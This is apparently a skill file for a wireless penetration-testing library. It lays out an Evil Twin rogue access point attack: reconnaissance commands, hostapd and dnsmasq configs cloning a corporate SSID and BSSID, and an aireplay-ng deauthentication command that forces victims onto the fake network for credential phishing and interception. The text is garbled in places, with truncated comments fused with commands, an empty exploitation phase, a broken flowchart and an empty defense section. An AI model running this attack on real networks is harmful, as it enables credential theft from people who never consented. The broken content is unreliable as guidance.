---
name: rogue-access-point-evil-twin
description: >
  Deploy an Evil Twin (Rogue Access Point) to clone a legitimate Wi-Fi network's SSID and MAC 
  address. By combining this with targeted deauthentication attacks, an attacker aggressively 
  forces nearby victims to silently connect to the malicious AP, enabling pervasive Man-in-the-Middle 
  (MitM), captive portal phishing, and credentials interception.
domain: cybersecurity
subdomain: penetration-testing
category: Wireless
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0006, TA0009]
  techniques: [T1659, T1111]
platforms: [hardware, network]
tags: [wireless, evil-twin, rogue-ap, wpa2, penetration-testing, deauth, phishing]
tools: [aircrack-ng, hostapd, dnsmasq, wifiphisher]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Rogue Access Point (Evil Twin)

## When to Use
- When conducting physical Red Team operations or precise Wireless Penetration Tests to validate if corporate employees will connect to untrusted networks (e.g., verifying Guest network isolation or testing Security Awareness).
- To aggressively intercept wireless network traffic when standard passive sniffing (monitor mode) yields only encrypted WPA2/WPA3 packets, which require offline cracking.
- To harvest corporate credentials directly from users via sophisticated Captive Portal phishing campaigns mimicking the target organization's authentic login page.


## Prerequisites
- Wireless adapter supporting monitor mode and packet injection (e.g., Alfa AWUS036ACH)
- Kali Linux or similar distribution with aircrack-ng suite installed
- Physical proximity to the target wireless network
- Authorization to test the target wireless infrastructure

## Workflow

### Phase 1: Reconnaissance (The Setup)

```bash
# Concept: To clone a network 1. Start Interface airmon-ng start wlan1

# 2. Sniff airodump-ng wlan1mon

# Target BSSID: 00:11:22:33:44:55
# Target SSID: "Corporate_Private"
# Target Channel: 6
```

### Phase 2: Building the Evil Twin

```bash
# Concept: We must 1. Configure Hostapd # cat <<EOF > hostapd.conf
interface=wlan1mon
ssid=Corporate_Private
bssid=00:11:22:33:44:55
hw_mode=g
channel=6
EOF

# 2. Configure # cat <<EOF > dnsmasq.conf
interface=wlan1mon
dhcp-range=192.168.1.10,192.168.1.100,8h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 3. Start hostapd hostapd.conf &
dnsmasq -C dnsmasq.conf -d &
```

### Phase 3: The Forced Migration (Deauthentication)

```bash
# Send aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c [VICTIM_MAC] wlan2mon
```

### Phase 4: Exploitation (Captive Portal / MitM)

```bash
# ```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Setup ] --> B[Host ]
    B --> C{Does ]}
    C -->|Yes| D[Capture ]
    C -->|No| E[Increase ]
    D --> F[Maintain ]
```

## 🔵 Blue Team Detection & Defense
- **Wireless Intrusion Prevention System (WIPS)**: **802.1X / Enterprise Security**: **Client-Side Awareness**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Rogue Access Point Evil Twin — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Wifiphisher: [The Rogue Access Point Framework](https://github.com/wifiphisher/wifiphisher)
- Aircrack-ng documentation: [Aireplay-ng Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication)
- DEF CON 25: [Advanced WiFi Attacks](https://www.youtube.com/watch?v=kYJjRk67bF8)
